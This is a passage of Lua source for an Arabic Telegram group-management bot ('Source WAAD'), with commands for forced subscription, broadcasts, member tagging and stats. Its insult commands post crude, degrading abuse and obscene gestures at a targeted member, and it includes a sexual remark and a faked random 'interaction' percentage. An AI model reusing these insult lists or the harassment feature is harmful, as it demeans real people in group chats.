getUser(msg.sender_user_id_,get_me)
end
end
--     Source WAAD     --
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" or text == "↫ تعيين قناة الاشتراك ⌯" or text == "تعيين الاشتراك الاجباري" or text == "وضع قناة الاشتراك" then
if not SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمطور الاساسي فقط ', 1, 'md')
else
DevAIAN:setex(WAAD..'DevAIAN4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_, '⌯︙ارسل لي معرف قناة الاشتراك الان')
end
return false  
end
if text == "تفعيل الاشتراك الاجباري" then  
if not SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمطور الاساسي فقط ', 1, 'md')
else
if DevAIAN:get(WAAD..'AIAN:ChId') then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevAIAN:get(WAAD.."AIAN:ChId"))
local GetInfo = JSON.decode(Check)
send(msg.chat_id_, msg.id_,"⌯︙الاشتراك الاجباري مفعل \n⌯︙على القناة ↫ [@"..GetInfo.result.username.."]")
else
DevAIAN:setex(WAAD..'DevAIAN4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_,"⌯︙لاتوجد قناة لتفعيل الاشتراك\n⌯︙ارسل لي معرف قناة الاشتراك الان")
end
end
return false  
end
if text == "تعطيل الاشتراك الاجباري" then  
if not SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمطور الاساسي فقط ', 1, 'md')
else
DevAIAN:del(WAAD..'AIAN:ChId')
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل الاشتراك الاجباري\n✓")
end
return false  
end
if text == "حذف قناة الاشتراك" or text == "حذف قناه الاشتراك" or text == "↫ حذف قناة الاشتراك ⌯" then
if not SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمطور الاساسي فقط ', 1, 'md')
else
DevAIAN:del(WAAD..'AIAN:ChId')
Dev_AIAN(msg.chat_id_, msg.id_, 1,"⌯︙تم حذف قناة الاشتراك الاجباري", 1, 'md') 
end
end
if SecondSudo(msg) then
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' or text == 'الاشتراك الاجباري' or text == 'قناة الاشتراك الاجباري' or text == '↫ قناة الاشتراك ⌯' then
if DevAIAN:get(WAAD..'AIAN:ChId') then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevAIAN:get(WAAD.."AIAN:ChId"))
local GetInfo = JSON.decode(Check)
send(msg.chat_id_, msg.id_, "⌯︙قناة الاشتراك ↫ [@"..GetInfo.result.username.."]")
else
send(msg.chat_id_, msg.id_, "⌯︙لاتوجد قناة في الاشتراك الاجباري")
end
return false  
end end
--     Source WAAD     --
if SudoBot(msg) then
if text == 'اذاعه للكل بالتوجيه' and tonumber(msg.reply_to_message_id_) > 0 then
function WAAD(extra,result,success)
if DevAIAN:get(WAAD.."AIAN:Send:Bot"..WAAD) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"⌯︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
local GpList = DevAIAN:smembers(WAAD.."AIAN:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = DevAIAN:smembers(WAAD.."AIAN:Users")
for k,v in pairs(PvList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم اذاعة رسالتك بالتوجيه \n⌯︙‏في ↫ ❨ '..#GpList..' ❩ مجموعه \n⌯︙والى ↫ ❨ '..#PvList..' ❩ مشترك \n ✓', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),WAAD)
end
end
--     Source WAAD     --
if text == "مشاهده المنشور" and ChCheck(msg) or text == "مشاهدات المنشور" and ChCheck(msg) or text == "عدد المشاهدات" and ChCheck(msg) then
DevAIAN:set(WAAD..'AIAN:viewget'..msg.sender_user_id_,true)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙حسنا قم باعادة توجيه للمنشور الذي تريدني حساب مشاهداته', 1, 'md')
end
--     Source WAAD     --
if text == "السورس" or text == "سورس" or text == "يا سورس" or text == "↫  السورس ⌯" then  
local url,res = https.request('https://api-WAAD.tk/Bots/chmeb/chmeb.php?user='..msg.sender_user_id_)
data = JSON.decode(url)
if data.result ~= true then
local WAAD = {"حبيبي","؏َـمࢪي","عزيزي","يڪلبي","روحي","حب","حــچي","ضلعي"} 
local WAAD = WAAD[math.random(#WAAD)]
local text =  [[⌯︙عذࢪاَ ]]..WAAD..[[ , آنت لست مشتࢪك
]]..data.Ch_Member.info..[[

ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
]] 
local inline = {{{text = '• اضغط هنا للاشتراك •', url="t.me/CXRCX"}}}
fucktele =  msg.id_/2097152/0.5
SendInline(msg.chat_id_,text,nil,inline,fucktele) 
return false
end
local Text =[[
⦑ Welcome to Source ⦒
 ⦑ Source WAAD ⦒ 
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ 
⌯︙ [Source Channel](t.me/CXRCX)
⌯︙ [Source Update ](t.me/FIDRG) 
⌯︙ [Source developer](t.me/VvTVv2) 
⌯︙ [Source programmer](t.me/mndzr) 
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ 
𓂅 . [TWS WAAD](t.me/S0DRGbot) 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𝐃𝐑𝐀𝐆𝐎𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/CXRCX"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/CXRCX&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source WAAD     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text == "اطردني" and ChCheck(msg) or text == "ادفرني" and ChCheck(msg) then
if DevAIAN:get(WAAD.."AIAN:Kick:Me"..msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevAIAN:set(WAAD..'yes'..msg.sender_user_id_..'', 'delyes')
DevAIAN:set(WAAD..'no'..msg.sender_user_id_..'', 'delno')
local WAAD = {"⌯︙هل انت متأڪد من المغادࢪه","⌯︙عمࢪي متاڪد تࢪيد اطࢪدك ؟ ♥️","⌯︙مدࢪي شون ينطيني گلبي اطࢪدك متاڪد؟","⌯︙ها يمعود ڪـول غيࢪها تࢪيد اطࢪدك مو ؟؟"} 
local Text = WAAD[math.random(#WAAD)]
local WAAD = {"يي 👋🏻","نعم"}
local WAAD = WAAD[math.random(#WAAD)]
local WAAD = {"لا اشاقة 🥲♥️","لا"}
local WAAD = WAAD[math.random(#WAAD)]
keyboard = {} 
keyboard.inline_keyboard = {{{text=WAAD,callback_data="/delyes"},{text=WAAD,callback_data="/delno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source WAAD     --
if text == 'تعطيل اطردني' and Manager(msg) and ChCheck(msg) then
DevAIAN:set(WAAD.."AIAN:Kick:Me"..msg.chat_id_, true)
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل امر اطردني\n✓")
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
DevAIAN:del(WAAD.."AIAN:Kick:Me"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل امر اطردني\n✓")
end
--     Source WAAD     --
if text == "نزلني" and ChCheck(msg) then
if DevAIAN:get(WAAD.."AIAN:Del:Me"..msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevAIAN:set(WAAD..'yesdel'..msg.sender_user_id_..'', 'delyes')
DevAIAN:set(WAAD..'nodel'..msg.sender_user_id_..'', 'delno')
local WAAD = {"⌯︙اي مو هيه ڪيه وانزلك 👌🏼😂 متاڪد انزلك ؟؟","⌯︙هل انت متأكد من تنزيلك","⌯︙تره اخذ ڪل الرتب منك !! متاڪد؟","⌯︙عمࢪي متاڪد تࢪيد انزلڪك ؟ ♥️"}
local Text = WAAD[math.random(#WAAD)]
local WAAD = {"يي 👋🏻","نعم"}
local WAAD = WAAD[math.random(#WAAD)]
local WAAD = {"لا اشاقة 🥲♥️","لا"}
local WAAD = WAAD[math.random(#WAAD)]
keyboard = {} 
keyboard.inline_keyboard = {{{text=WAAD,callback_data="/yesdel"},{text=WAAD,callback_data="/nodel"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source WAAD     --
if text == 'تعطيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevAIAN:set(WAAD.."AIAN:Del:Me"..msg.chat_id_, true)
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل امر نزلني\n✓")
end
if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevAIAN:del(WAAD.."AIAN:Del:Me"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل امر نزلني\n✓")
end
--     Source WAAD     --
if text and (text == 'تفعيل التاك' or text == 'تفعيل التاك للكل' or text == 'تفعيل تاك للكل') and Admin(msg) and ChCheck(msg) then 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل امر تاك للكل\n✓")
DevAIAN:del(WAAD..'AIAN:Lock:TagAll'..msg.chat_id_)
end
if text and (text == 'تعطيل التاك' or text == 'تعطيل التاك للكل' or text == 'تعطيل تاك للكل') and Admin(msg) and ChCheck(msg) then 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل امر تاك للكل\n✓")
DevAIAN:set(WAAD..'AIAN:Lock:TagAll'..msg.chat_id_,true)
end
if Admin(msg) then
if text == "تاك للكل" and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "⌯︙وينكم يالربع \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevAIAN:get(WAAD..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevAIAN:get(WAAD..'Save:UserName'..v.user_id_).."]\n"
else
text = text..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
--     Source WAAD     --
if text and text:match("^كللهم (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(كللهم) (.*)$")}
if not DevAIAN:get(WAAD..'AIAN:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "⌯︙"..txt[2].." \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevAIAN:get(WAAD..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevAIAN:get(WAAD..'Save:UserName'..v.user_id_).."]\n"
else
text = text..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
end
--     Source WAAD     --
if text == "رسائلي" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then
local user_msgs = DevAIAN:get(WAAD..'AIAN:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙عدد رسائلك هنا ↫ *❨ "..user_msgs.." ❩*", 1, 'md')
end
if text == "التفاعل" and ChCheck(msg) then
local EntryNumber = (DevAIAN:get(WAAD..'AIAN:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevAIAN:get(WAAD..'AIAN:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevAIAN:get(WAAD..'AIAN:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙انضمام الاعضاء اليوم ↫ *"..EntryNumber.."*\n⌯︙مغادرة الاعضاء اليوم ↫ *"..ExitNumber.."*\n⌯︙عدد الرسائل اليوم ↫ *"..MsgNumberDay.."*\n⌯︙نسبة التفاعل اليوم ↫ *"..math.random(40,100).."%*", 1, 'md')
end
--     Source WAAD     --
if text == "معرفي" and ChCheck(msg) then
function get_username(extra,result,success)
text = '⌯︙معرفك ↫ ❨ User ❩'
local text = text:gsub('User',('@'..result.username_ or ''))
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
if text == "اسمي" and ChCheck(msg) then
function get_firstname(extra,result,success)
text = '⌯︙اسمك ↫ firstname lastname'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end   
--     Source WAAD     --
--if text == "اهمس" or text == "همسه" or text == "اريد بوت الهمسه" or text == "دزلي بوت الهمسه" or  text == "دزولي بوت الهمسه" then  Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙@VvTVv2', 1, 'md') end
if text == "رابط حذف" or text == "رابط الحذف" or text == "اريد رابط الحذف" or  text == "شمرلي رابط الحذف" or text == "اريد رابط حذف" then
local inline = {{{text="• Telegram •",url="https://my.telegram.org/auth?to=delete"}},{{text="• instagram •",url="https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/"}},{{text="• Facebook •",url="https://www.facebook.com/help/deleteaccount"}},{{text="• Snspchat •",url="https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount"}},{{text="🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙳𝚁𝙰𝙶𝙾𝙽. ",url="https://t.me/S0DRG"}}} SendInline(msg.chat_id_,'⌯︙رابط الحذف في جميع مواقع التواصل \nفكر قبل لا تتسرع وتروح',nil,inline) return false end
if text == "بوت الحذف" or text == "اريد بوت الحذف" or text == "اريد بوت حذف" or text == "بوت حذف" or text == "بوت حذف حسابات" or text == "راح احذف" then local inline = {{{text="• del Account 🐉.",url="https://t.me/de0lBOT"}}} SendInline(msg.chat_id_,'⌯︙اضغط للحصول على البوت',nil,inline) return false end
if text == "بوت حذف الميديا" or text == "اريد بوت الميديا" or text == "اريد بوت ميديا" or text == "بوت امسح" or text == "بوت كلينر " or text == "تنظيف الميديا" then local inline = {{{text="• WAAD Cleaner 🐉.",url="https://t.me/drg0bot"}}} SendInline(msg.chat_id_,'⌯︙اضغط للحصول على البوت',nil,inline) return false end
if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevAIAN:get(WAAD..'AIAN:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevAIAN:get(WAAD..'AIAN:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
if text == "ايديي" and ChCheck(msg) then Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙ايديك ↫ ❨ `'..msg.sender_user_id_..'` ❩', 1, 'md') end
if text == "رتبتي" and ChCheck(msg) then Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'html') end
if text == "ايدي المجموعه" and ChCheck(msg) then Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ايدي المجموعه ↫ `"..msg.chat_id_.."`", 1, 'md') end
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevAIAN:del(WAAD..'AIAN:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevAIAN:del(WAAD..'AIAN:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
--     Source WAAD     --
if text == "المطور" then 
local DevText = DevAIAN:get(WAAD.."DevText")
if DevAIAN:get(WAAD.."AIAN:ChId") then local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevAIAN:get(WAAD.."AIAN:ChId")) local GetInfo = JSON.decode(Check) 
local DevCh1 = GetInfo.result.username DevCh = '\n⌯︙*D𝐞𝐯 C𝐡* ↬ [@'..DevCh1..']' else DevCh = '' end
tdcli_function({ID="GetUser",user_id_=WAAD},function(arg,dp) 
if dp.username_ ~= false then DevUser = '@'..dp.username_ else DevUser = dp.first_name_ end
local DevName = '['..dp.first_name_..'](tg://user?id='..dp.id_..')'
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = WAAD,offset_ = 0,limit_ = 1},function(extra,SoOoFi,success) 
if DevText then
if SoOoFi.photos_[0] then
keyboard = {} 
keyboard.inline_keyboard = {{{text=dp.first_name_,url=("t.me/"..dp.username_ or "t.me/CXRCX")}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id='..msg.chat_id_..'&photo='..SoOoFi.photos_[0].sizes_[1].photo_.persistent_id_..'&caption='..URL.escape(DevText).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
Dev_AIAN(msg.chat_id_, msg.id_, 1,'['..DevText..']', 1, "md")
end
else
if SoOoFi.photos_[0] then
local bio = GetBio(dp.id_,msg.chat_id_)
local Text = '⌯︙*D𝐞𝐯 N𝐞𝐦𝐚* ↬ '..DevName..'\n⌯︙*D𝐞𝐯 U𝐬𝐞𝐫* ↬ ['..DevUser..']\n⌯︙*D𝐞𝐯 I𝐝* ↬ ( `'..WAAD..'` )'..DevCh..'\n⌯︙*D𝐞𝐯 B𝐢𝐨* ↬ ['..bio..']'
keyboard = {} 
keyboard.inline_keyboard = {{{text='• '..dp.first_name_..' •',url=("t.me/"..dp.username_ or "t.me/CXRCX")}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id='..msg.chat_id_..'&photo='..SoOoFi.photos_[0].sizes_[1].photo_.persistent_id_..'&caption='..URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, Text, 1, "md")
end
end
end,nil)
end,nil)
end 
if text == "مبرمج السورس" or text == "مطور السورس" or text == "المبرمج" then 
Text = "• *The developer and programmer of this source is* : [𝚂𝙾𝙵𝙸 || صـوفي](https://t.me/VvTVv2)."
keyboard = {} 
keyboard.inline_keyboard = {{{text='• 𝚂𝙾𝙵𝙸 || صـوفي •',url="t.me/VvTVv2"}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id='..msg.chat_id_..'&photo=https://t.me/VvTVv2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     Source WAAD     --
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') then 
if not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^هينه @(.*)') or text:match('^هينها @(.*)') 
function WAAD(extra,result,success)
if tonumber(result.id_) == tonumber(119541395) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, 'دروح عمي روح لا ضحك العالم عليك لا تندك بمطور السورس😏🔥', 1, 'md')  
return false  
end  
if tonumber(result.id_) == tonumber(16076569) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, 'مبرمج دراكون اهينك ما اهينه😏🖕🏿', 1, 'md')
return false  
end  
if result.id_ then  
if tonumber(result.id_) == tonumber(WAAD) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔🏌🏼', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(WAAD) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, 'دي لڪك تريد اهينن تاج راسڪك؟😏🖕🏿', 1, 'md') 
return false  
end  
if DevAIAN:sismember(WAAD.."AIAN:AIANConstructor:"..msg.chat_id_,result.id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, 'دي لڪك تريد اهينن تاج راسڪك؟😏🖕🏿', 1, 'md')
return false
end 
local WAAD = {"صاࢪࢪ ستاذيي 🏃🏻‍♂️♥️","تأمࢪ آمࢪ","دقـيقهۂَ","لـححضهۂ","هسههہ","هَـسۿ ، ثوانيي"} 
Dev_AIAN(msg.chat_id_, msg.id_, 1,''..WAAD[math.random(#WAAD)]..'', 1, 'md') 
local WAAD = { "لڪك جرجف @"..username.." احترم اسيادكك لا اكتلڪك وازربب على كبركك،💩🖐🏿","هشش لڪك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_AIAN(msg.chat_id_, result.id_, 1,''..WAAD[math.random(#WAAD)]..'', 1, 'html') 
else  
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,WAAD)
end
end
--     Source WAAD     --
if text == ("هينه") or text == ("بعد هينه") or text == ("هينه بعد") or text == ("لك هينه") or text == ("هينها") or text == ("هينهه") or text == ("رزله") or text == ("رزلهه") or text == ("رزلها") then
if not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(119541395) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, 'دروح عمي روح لا ضحك العالم عليك لا تندك بمطور السورس😏🖕🏿', 1, 'md') 
return false
end 
if tonumber(result.sender_user_id_) == tonumber(16076569) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, 'مبرمج دراكون اهينك ما اهينه😏🖕🏿', 1, 'md')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(WAAD) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(WAAD) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, 'دي لڪك تريد اهينن تاج راسڪك؟😏🖕🏿', 1, 'md')
return false
end 
if DevAIAN:sismember(WAAD.."AIAN:AIANConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, 'دي لڪك تريد اهينن تاج راسڪك؟😏🖕🏿', 1, 'md')
return false
end 
local WAAD = {"صاࢪࢪ ستاذيي 🏃🏻‍♂️♥️","تأمࢪ آمࢪ","دقـيقهۂَ","لـححضهۂ","هسههہ","هَـسۿ ، ثوانيي"} 
Dev_AIAN(msg.chat_id_, msg.id_, 1,''..WAAD[math.random(#WAAD)]..'', 1, 'md') 
local WAAD = {"لڪك جرجف احترم اسيادكك لا اكتلڪك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_AIAN(msg.chat_id_, result.id_, 1,''..WAAD[math.random(#WAAD)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
end
if text == ("بوسه") or text == ("بعد بوسه") or text == ("ضل بوس") or text == ("بوسه بعد") or text == ("بوسها") or text == ("بعد بوسها") or text == ("ضل بوس") or text == ("بوسها بعد") or text == ("بوسهه") then
if not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(WAAD) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(119541395) then  
Dev_AIAN(msg.chat_id_, result.id_, 1, 'امصه مص مو بس ابوسه هذا مواححح 👅 💋', 1, 'html')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(WAAD) then  
Dev_AIAN(msg.chat_id_, result.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗', 1, 'html')
return false
end 
local WAAD = {"صاࢪࢪ ستاذيي 🏃🏻‍♂️♥️","تأمࢪ آمࢪ","وفـبسہ🤤","؏ـمـريـہٰ تدلل","هسههہ ابوسس","هَـسۿ ، פـياتيہ"} 
Dev_AIAN(msg.chat_id_, msg.id_, 1,''..WAAD[math.random(#WAAD)]..'', 1, 'md') 
local WAAD = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_AIAN(msg.chat_id_, result.id_, 1,''..WAAD[math.random(#WAAD)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end
end
end
if text == ("صيحه") or text == ("صيحها") or text == ("صيحهه") or text == ("صيح") then
if not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) then
function seha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(WAAD) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(119541395) then  
Dev_AIAN(msg.chat_id_, result.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️', 1, 'html')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(WAAD) then  
Dev_AIAN(msg.chat_id_, result.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️', 1, 'html')
return false
end 
local WAAD = {"صاࢪࢪ ستاذيي 🏃🏻‍♂️♥️","تأمࢪ آمࢪ","؏ـمـريـہٰ تدلل","شسالفهہ هسههہ اصيحه","هَـسۿ ، פـياتيہ"} 
Dev_AIAN(msg.chat_id_, msg.id_, 1,''..WAAD[math.random(#WAAD)]..'', 1, 'md') 
local WAAD = {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لڪك ديصيحوك😐🖤"} 
Dev_AIAN(msg.chat_id_, result.id_, 1,''..WAAD[math.random(#WAAD)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)   
end
end
end
--     Source WAAD     --
